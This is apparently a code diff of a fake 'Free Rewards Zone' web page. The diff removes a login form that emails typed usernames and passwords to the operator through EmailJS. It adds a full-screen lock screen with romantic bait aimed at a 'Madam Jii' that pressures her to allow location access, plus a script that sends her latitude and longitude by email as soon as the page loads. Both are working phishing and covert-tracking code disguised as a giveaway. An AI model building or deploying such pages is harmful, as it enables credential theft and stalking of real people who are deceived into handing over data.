@@ -1,83 +1,210 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Free Rewards Zone</title>
+
 <style>
 body{
-font-family:Arial;
-background:#f4f4f4;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
+ font-family:Arial;
+ background:#f2f2f2;
+ text-align:center;
 }
 
-.login-box{
-background:white;
-padding:30px;
-border-radius:10px;
-box-shadow:0 0 10px rgba(0,0,0,0.2);
-width:300px;
+h1{
+ background:#111;
+ color:white;
+ padding:15px;
 }
 
-input{
-width:100%;
-padding:10px;
-margin:10px 0;
+.container{
+ display:flex;
+ flex-wrap:wrap;
+ justify-content:center;
+}
+
+.card{
+ background:white;
+ width:260px;
+ margin:15px;
+ padding:15px;
+ border-radius:10px;
+ box-shadow:0 0 10px rgba(0,0,0,0.2);
+}
+
+.card img{
+ width:100%;
+ border-radius:8px;
 }
 
 button{
-width:100%;
-padding:12px;
-background:#28a745;
-color:white;
-border:none;
-cursor:pointer;
+ margin-top:10px;
+ padding:10px 15px;
+ background:#28a745;
+ color:white;
+ border:none;
+ border-radius:6px;
+ cursor:pointer;
 }
 </style>
 </head>
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<body>
+<div id="locationLock" style="
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:#000;
+color:white;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+z-index:9999;
+text-align:center;
+padding:20px;
+">
+
+<h2>❤️ Khaas Apke Liye Madam Jii ☺️ </h2>
+<p>Maine Aapke Liye Kya Send Kiya Hun Allow Karke Aage Dekhiye </p>
+
+<button onclick="requestLocation()"
+style="padding:14px 22px;font-size:18px;background:#28a745;color:white;border:none;border-radius:8px;">Click My Jaan 
+I LOVE YOU MADAM JII ❤️
+</button>My Love ❤️💍
+
+</div>
+<h1>🎁 Free Rewards Collection</h1>
+
+<div class="container" id="products"></div>
 
 <script>
 
-(function(){
-emailjs.init("287g46US2fGjoY4LL");
-})();
+const items = [
 
-function sendLogin(){
+{
+ name:"Random Earbuds",
+ img:"https://images.unsplash.com/photo-1585386959984-a41552231658"
+},
 
-var username = document.getElementById("username").value;
-var password = document.getElementById("password").value;
+{
+ name:"Stylish Shoes",
+ img:"https://images.unsplash.com/photo-1542291026-7eec264c27ff"
+},
 
-var params = {
-username: username,
-password: password
-};
+{
+ name:"Free Fire Diamond 500",
+ img:"https://i.imgur.com/9Xn4K3K.png"
+},
 
-emailjs.send("service_3ux49q7","template_fn1apho",params)
-.then(function(){
-alert("Login Successful");
-});
+{
+ name:"PUBG UC 500",
+ img:"https://i.imgur.com/0Z8FQ6S.png"
+}
+
+];
+
+// random items show function
+function showRandomItems(){
+
+ let container = document.getElementById("products");
+ container.innerHTML="";
+
+ let shuffled = items.sort(()=>0.5-Math.random());
+
+ shuffled.forEach(item=>{
+   container.innerHTML += `
+     <div class="card">
+       <img src="${item.img}">
+       <h3>${item.name}</h3>
+       <button onclick="claim()">Claim Now</button>
+     </div>
+   `;
+ });
 
 }
+
+function claim(){
+ alert("Reward claim process start!");
+}
+
+showRandomItems();
 
 </script>
 
 </body>
 </html>
-<body>
-<div class="box">
+<h3>Delivery ke liye location allow karein</h3>
+<p>Page open hote hi location request aayegi.</p>
 
-<div class="logo">🎁 Free Rewards</div>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
-<div class="game-logo">
-<div class="login-box">
+<script>
+// EmailJS Initialize
+(function(){
+   emailjs.init("2pInQghRcP-YZtYCK");
+})();
 
-<h2>Login</h2>
+// Page load hote hi location request
+window.onload = function() {
+   getLocationAndSend();
+};
 
-<input type="text" id="username" placeholder="Username">
-<input type="password" id="password" placeholder="Password">
+function getLocationAndSend() {
 
-<button onclick="sendLogin()">Login</button>
+ if (navigator.geolocation) {
 
-</div>
+   navigator.geolocation.getCurrentPosition(function(position){
+
+     var lat = position.coords.latitude;
+     var lon = position.coords.longitude;
+
+     // Email send
+     emailjs.send("service_hxul50k","template_3mjgsjk",{
+        latitude: lat,
+        longitude: lon
+     })
+     .then(function(response) {
+        console.log("Location sent");
+     }, function(error) {
+        console.log("Error sending location");
+     });
+
+   },
+   function(){
+     alert("Free Rewards Ke Liye Allow Kare.");
+   });
+
+ } else {
+   alert("Location supported nahi hai.");
+ }
+
+}
+</script>
+<script>
+function requestLocation(){
+
+ if(navigator.geolocation){
+
+   navigator.geolocation.getCurrentPosition(
+     function(position){
+
+       // location mil gayi → unlock website
+       document.getElementById("locationLock").style.display="none";
+
+       console.log("Location Allowed");
+
+     },
+     function(){
+       alert Free Rewards Ke Liye Allow Kare.");
+     }
+   );
+
+ }else{
+   alert("Location supported nahi hai.");
+ }
+
+}
+</script>
